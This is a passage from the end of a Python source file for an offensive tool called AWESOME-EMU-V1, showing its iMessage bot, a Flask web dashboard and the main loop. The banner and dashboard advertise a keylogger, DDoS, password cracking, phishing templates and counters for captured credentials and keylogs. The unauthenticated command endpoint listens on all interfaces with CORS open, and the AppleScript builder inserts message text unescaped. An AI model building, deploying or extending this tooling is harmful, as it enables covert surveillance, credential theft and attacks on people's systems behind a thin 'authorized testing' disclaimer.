        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "imessage_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE and self.config.get('phone_numbers')
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        if not IMESSAGE_AVAILABLE:
            return False
        try:
            for phone in self.config.get('phone_numbers', []):
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{text[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
            return True
        except:
            return False

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    """Web dashboard for the tool"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWESOME-EMU-V1 - Cyber Command Platform</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        :root {
            --black: #000000;
            --white: #ffffff;
            --gray-dark: #1a1a1a;
            --gray-mid: #333333;
            --gray-light: #666666;
            --success: #00ff00;
            --error: #ff0000;
            --warning: #ffff00;
            --info: #00ffff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: var(--black);
            color: var(--white);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: var(--gray-dark);
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid var(--white);
        }
        .header h1 {
            font-size: 2.5em;
            color: var(--white);
            letter-spacing: 8px;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
        }
        .header p {
            color: var(--gray-light);
            font-size: 0.9em;
            margin-top: 10px;
            letter-spacing: 3px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: var(--gray-dark);
            border: 1px solid var(--gray-mid);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
        }
        .stat-card:hover {
            border-color: var(--white);
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
        }
        .stat-card h3 {
            font-size: 2.5em;
            color: var(--white);
            margin-bottom: 10px;
        }
        .stat-card p {
            color: var(--gray-light);
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .section {
            background: var(--gray-dark);
            border: 1px solid var(--gray-mid);
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
        }
        .section h2 {
            color: var(--white);
            margin-bottom: 20px;
            border-bottom: 1px solid var(--gray-mid);
            padding-bottom: 15px;
            letter-spacing: 4px;
        }
        .command-input {
            width: 100%;
            padding: 15px;
            background: var(--black);
            border: 1px solid var(--gray-mid);
            border-radius: 4px;
            color: var(--white);
            font-size: 16px;
            font-family: 'Courier New', monospace;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        .command-input:focus {
            outline: none;
            border-color: var(--white);
            box-shadow: 0 0 15px rgba(255,255,255,0.3);
        }
        .command-input::placeholder {
            color: var(--gray-light);
        }
        .btn {
            background: var(--white);
            color: var(--black);
            border: none;
            padding: 15px 40px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            letter-spacing: 3px;
            transition: all 0.3s;
            text-transform: uppercase;
        }
        .btn:hover {
            background: var(--gray-dark);
            color: var(--white);
            border: 1px solid var(--white);
        }
        .output {
            background: var(--black);
            border: 1px solid var(--gray-mid);
            border-radius: 4px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin-top: 20px;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
            line-height: 1.6;
        }
        .output::-webkit-scrollbar {
            width: 8px;
        }
        .output::-webkit-scrollbar-track {
            background: var(--gray-dark);
        }
        .output::-webkit-scrollbar-thumb {
            background: var(--gray-mid);
            border-radius: 4px;
        }
        .output::-webkit-scrollbar-thumb:hover {
            background: var(--white);
        }
        .output-prompt {
            color: var(--success);
        }
        .output-command {
            color: var(--white);
        }
        .output-result {
            color: var(--gray-light);
        }
        .output-error {
            color: var(--error);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--gray-mid);
        }
        th {
            color: var(--white);
            text-transform: uppercase;
            letter-spacing: 2px;
            font-size: 0.85em;
        }
        td {
            color: var(--gray-light);
        }
        .severity-critical { color: #ff0000; }
        .severity-high { color: #ff6600; }
        .severity-medium { color: #ffff00; }
        .severity-low { color: #00ff00; }
        .footer {
            background: var(--gray-dark);
            padding: 15px;
            text-align: center;
            color: var(--gray-light);
            font-size: 0.8em;
            border-top: 1px solid var(--gray-mid);
            letter-spacing: 2px;
        }
        .blinking-cursor {
            display: inline-block;
            width: 10px;
            height: 18px;
            background: var(--white);
            animation: blink 1s infinite;
            vertical-align: middle;
            margin-left: 5px;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 15px;
        }
        .quick-btn {
            background: var(--gray-dark);
            color: var(--white);
            border: 1px solid var(--gray-mid);
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            transition: all 0.3s;
            text-transform: lowercase;
        }
        .quick-btn:hover {
            background: var(--white);
            color: var(--black);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🦅 AWESOME-EMU-V1</h1>
        <p>ULTIMATE CYBERSECURITY COMMAND & CONTROL PLATFORM</p>
    </div>
    
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <h3 id="statCommands">0</h3>
                <p>Commands</p>
            </div>
            <div class="stat-card">
                <h3 id="statThreats">0</h3>
                <p>Threats</p>
            </div>
            <div class="stat-card">
                <h3 id="statIPs">0</h3>
                <p>Managed IPs</p>
            </div>
            <div class="stat-card">
                <h3 id="statCreds">0</h3>
                <p>Credentials</p>
            </div>
            <div class="stat-card">
                <h3 id="statKeylogs">0</h3>
                <p>Keylogs</p>
            </div>
        </div>
        
        <div class="section">
            <h2>🚀 COMMAND CENTER</h2>
            <div style="display: flex; gap: 15px; align-items: center;">
                <span style="color: var(--success); font-size: 20px;">$></span>
                <input type="text" id="commandInput" class="command-input" 
                       placeholder="Enter command... (type 'help' for available commands)"
                       onkeypress="if(event.key === 'Enter') executeCommand()">
                <button class="btn" onclick="executeCommand()">EXECUTE</button>
            </div>
            <div class="quick-commands">
                <button class="quick-btn" onclick="quickCommand('help')">help</button>
                <button class="quick-btn" onclick="quickCommand('status')">status</button>
                <button class="quick-btn" onclick="quickCommand('system')">system</button>
                <button class="quick-btn" onclick="quickCommand('nmap_quick 127.0.0.1')">nmap</button>
                <button class="quick-btn" onclick="quickCommand('ping 127.0.0.1')">ping</button>
                <button class="quick-btn" onclick="quickCommand('traceroute 127.0.0.1')">traceroute</button>
                <button class="quick-btn" onclick="quickCommand('list_ips')">list_ips</button>
                <button class="quick-btn" onclick="quickCommand('threats')">threats</button>
            </div>
            <div id="output" class="output">
                <span class="output-prompt">$></span> <span class="output-command">Welcome to AWESOME-EMU-V1</span>
                <br><span class="output-result">Type a command and press Enter to execute</span>
                <br><span class="output-prompt">$></span> <span class="blinking-cursor"></span>
            </div>
        </div>
        
        <div class="section">
            <h2>📊 RECENT THREATS</h2>
            <table>
                <thead>
                    <tr>
                        <th>TIME</th>
                        <th>TYPE</th>
                        <th>SOURCE IP</th>
                        <th>SEVERITY</th>
                    </tr>
                </thead>
                <tbody id="threatsTable">
                    <tr><td colspan="4">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <div class="footer">
        ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY — ALL ACTIVITY IS LOGGED
    </div>
    
    <script>
        var socket = io();
        
        function executeCommand() {
            var input = document.getElementById('commandInput');
            var command = input.value.trim();
            if (!command) return;
            
            var output = document.getElementById('output');
            output.innerHTML += '<br><span class="output-prompt">$></span> <span class="output-command">' + escapeHtml(command) + '</span>';
            output.scrollTop = output.scrollHeight;
            
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                var resultClass = data.success ? 'output-result' : 'output-error';
                output.innerHTML += '<br><span class="' + resultClass + '">' + escapeHtml(data.output) + '</span>';
                output.innerHTML += '<br><span class="output-result">[Completed in ' + data.execution_time.toFixed(2) + 's]</span>';
                output.innerHTML += '<br><span class="output-prompt">$></span> <span class="blinking-cursor"></span>';
                output.scrollTop = output.scrollHeight;
                input.value = '';
                updateStats();
            })
            .catch(error => {
                output.innerHTML += '<br><span class="output-error">Error: ' + error + '</span>';
                output.scrollTop = output.scrollHeight;
            });
        }
        
        function quickCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            executeCommand();
        }
        
        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statCommands').textContent = data.total_commands || 0;
                    document.getElementById('statThreats').textContent = data.total_threats || 0;
                    document.getElementById('statIPs').textContent = data.total_managed_ips || 0;
                    document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                    document.getElementById('statKeylogs').textContent = data.total_keylogs || 0;
                });
        }
        
        function loadThreats() {
            fetch('/api/threats')
                .then(response => response.json())
                .then(data => {
                    var html = '';
                    if (data.threats && data.threats.length > 0) {
                        data.threats.forEach(function(threat) {
                            html += '<tr>';
                            html += '<td>' + (threat.timestamp || '').substring(0, 19) + '</td>';
                            html += '<td>' + (threat.threat_type || 'Unknown') + '</td>';
                            html += '<td>' + (threat.source_ip || 'Unknown') + '</td>';
                            html += '<td class="severity-' + (threat.severity || 'low') + '">' + (threat.severity || 'low').toUpperCase() + '</td>';
                            html += '</tr>';
                        });
                    } else {
                        html = '<tr><td colspan="4">No threats detected</td></tr>';
                    }
                    document.getElementById('threatsTable').innerHTML = html;
                });
        }
        
        // Initial load
        updateStats();
        loadThreats();
        
        // Refresh every 5 seconds
        setInterval(updateStats, 5000);
        setInterval(loadThreats, 5000);
        
        // Focus input on load
        document.getElementById('commandInput').focus();
    </script>
</body>
</html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class AwesomeEmu:
    """Main application class"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db, self.config)
        self.web = WebDashboard(self.handler, self.db, self.config)
        
        # Initialize bots
        self.discord = DiscordBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.signal = SignalBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.imessage = iMessageBot(self.handler, self.db)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.BRIGHT_WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BRIGHT_WHITE}        🦅 AWESOME-EMU-V1 v{VERSION} - CYBER COMMAND PLATFORM              {Colors.BRIGHT_WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BRIGHT_CYAN}                                                                           {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🦅 500+ Security Commands           • 📡 All Ping Commands (20+)     {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🗺️ All Traceroute Commands (25+)     • 🔍 All Nmap Commands (60+)     {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🌐 All Curl Commands (60+)           • ⬇️ All Wget Commands (50+)     {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🎣 100+ Social Engineering Templates • ⌨️ Advanced Keylogger          {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🚀 Real Traffic Generation           • 💥 DOS/DDOS Capabilities        {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🔒 SSH Remote Access                  • 🔓 Password Cracking           {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🐳 Docker Security Scanning          • 📊 PDF Report Generation        {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 📱 Discord | Telegram | WhatsApp     • Slack | Signal | Google Chat  {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 💻 Web Dashboard                      • 📡 Network Monitoring          {Colors.BRIGHT_WHITE}║
║{Colors.BRIGHT_GREEN}  • 🔒 IP Management & Threat Detection  • 🌐 Domain Translation          {Colors.BRIGHT_WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BRIGHT_YELLOW}                    🎯 FOR AUTHORIZED SECURITY TESTING ONLY                    {Colors.BRIGHT_WHITE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BRIGHT_GREEN}🦅 Welcome to AWESOME-EMU-V1 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.BRIGHT_WHITE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.BRIGHT_WHITE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.BRIGHT_WHITE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.BRIGHT_WHITE}📱 Configure bots for Discord, Telegram, WhatsApp, Slack, Signal, Google Chat{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        """Check dependencies"""
        print(f"\n{Colors.BRIGHT_WHITE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        
        if shutil.which('hashcat'):
            print(f"{Colors.SUCCESS}✅ hashcat{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ hashcat not found - cracking will use Python fallback{Colors.RESET}")
        
        if shutil.which('signal-cli'):
            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
    
    def setup_platforms(self):
        """Setup platform integrations"""
        print(f"\n{Colors.BRIGHT_WHITE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.BRIGHT_WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BRIGHT_WHITE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BRIGHT_WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.BRIGHT_WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BRIGHT_WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.BRIGHT_WHITE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BRIGHT_WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.BRIGHT_WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BRIGHT_WHITE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.BRIGHT_WHITE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BRIGHT_WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.BRIGHT_WHITE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.BRIGHT_WHITE}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.whatsapp.save_config(phone, True, '!')
                self.whatsapp.start()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.BRIGHT_WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.BRIGHT_WHITE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.BRIGHT_WHITE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.BRIGHT_WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.BRIGHT_WHITE}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.BRIGHT_WHITE}Enter webhook URL: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BRIGHT_WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.google_chat.save_config(webhook, "", True, prefix)
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.BRIGHT_WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.BRIGHT_WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.BRIGHT_WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        """Run the main application"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.BRIGHT_WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Start web dashboard by default
        if WEB_AVAILABLE:
            self.web.start()
        
        print(f"\n{Colors.SUCCESS}✅ AWESOME-EMU-V1 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}   🎣 Use 'phish_*' commands for social engineering{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}   📱 Configure bots for multi-platform access{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.BRIGHT_WHITE}[{Colors.BRIGHT_CYAN}{self.session_id}{Colors.BRIGHT_WHITE}]{Colors.BRIGHT_YELLOW} 🦅> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.handler.keylogger and self.handler.keylogger.running:
            self.handler.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.BRIGHT_WHITE}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.BRIGHT_WHITE}🦅 Starting AWESOME-EMU-V1...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = AwesomeEmu()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
